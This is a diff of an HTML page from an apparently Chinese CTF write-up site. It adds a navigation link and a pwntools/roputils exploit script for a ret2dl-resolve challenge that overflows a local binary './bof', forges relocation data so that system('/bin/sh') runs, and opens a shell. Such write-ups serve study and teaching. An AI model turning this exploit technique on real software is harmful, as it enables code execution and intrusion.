@@ -1714,6 +1714,18 @@
 
 
   <li class="md-nav__item">
+    <a href="../../crypto/md5padding/" title="Md5padding" class="md-nav__link">
+      Md5padding
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
     <a href="../../crypto/rsa待填/" title="Rsa待填" class="md-nav__link">
       Rsa待填
     </a>
@@ -2828,7 +2840,7 @@ ELF32_R_TYPE=7
 然后我们就可以伪造<code>.st_name</code>，把write改成system...<br />
 好长的ROP啊</p>
 <h2 id="exp">exp<a class="headerlink" href="#exp" title="Permanent link">&para;</a></h2>
-<p>“你猜怎么伪造<code>.st_name</code>”
+<p>“你猜怎么伪造<code>.st_name</code>”</p>
 <div class="codehilite"><pre><span></span><span class="ch">#!/usr/bin/python</span>
 
 <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
@@ -2890,6 +2902,32 @@ ELF32_R_TYPE=7
 <span class="n">payload2</span> <span class="o">+=</span> <span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">100</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload2</span><span class="p">))</span>
 <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>
 <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+
+<p>“给出一个使用roputils的方法”
+<div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">roputils</span> <span class="kn">import</span> <span class="n">ROP</span>
+<span class="n">fpath</span><span class="o">=</span><span class="s1">&#39;./bof&#39;</span>
+<span class="n">p</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="n">fpath</span><span class="p">)</span>
+<span class="n">elf</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="n">fpath</span><span class="p">)</span>
+<span class="n">rop</span><span class="o">=</span><span class="n">ROP</span><span class="p">(</span><span class="n">fpath</span><span class="p">)</span>
+<span class="c1"># context.terminal=[&#39;zsh&#39;]</span>
+<span class="n">bss_addr</span><span class="o">=</span><span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">()</span>
+<span class="n">ret_offset</span><span class="o">=</span><span class="mh">0x6c</span><span class="o">+</span><span class="mi">4</span>
+<span class="n">payload</span><span class="o">=</span><span class="n">rop</span><span class="o">.</span><span class="n">retfill</span><span class="p">(</span><span class="n">ret_offset</span><span class="p">)</span>
+<span class="n">base_stage</span><span class="o">=</span><span class="n">bss_addr</span><span class="o">+</span><span class="mh">0x20</span>
+<span class="n">payload</span><span class="o">+=</span><span class="n">rop</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="s1">&#39;read&#39;</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">base_stage</span><span class="p">,</span><span class="mi">100</span><span class="p">)</span>
+<span class="c1">#第一个是fake_reloc...的地址，第二个是调用函数的参数列表</span>
+<span class="n">payload</span><span class="o">+=</span><span class="n">rop</span><span class="o">.</span><span class="n">dl_resolve_call</span><span class="p">(</span><span class="n">base_stage</span><span class="o">+</span><span class="mh">0x30</span><span class="p">,</span><span class="n">base_stage</span><span class="p">)</span>
+<span class="n">payload</span><span class="o">+=</span><span class="n">rop</span><span class="o">.</span><span class="n">fill</span><span class="p">(</span><span class="mh">0x100</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">payload</span><span class="o">=</span><span class="n">rop</span><span class="o">.</span><span class="n">string</span><span class="p">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">)</span>
+<span class="n">payload</span><span class="o">+=</span><span class="n">rop</span><span class="o">.</span><span class="n">fill</span><span class="p">(</span><span class="mh">0x30</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">payload</span><span class="o">+=</span><span class="n">rop</span><span class="o">.</span><span class="n">dl_resolve_data</span><span class="p">(</span><span class="n">base_stage</span><span class="o">+</span><span class="mh">0x30</span><span class="p">,</span><span class="s1">&#39;system&#39;</span><span class="p">)</span>
+<span class="n">payload</span><span class="o">+=</span><span class="n">rop</span><span class="o">.</span><span class="n">fill</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </pre></div></p>
                 
                   
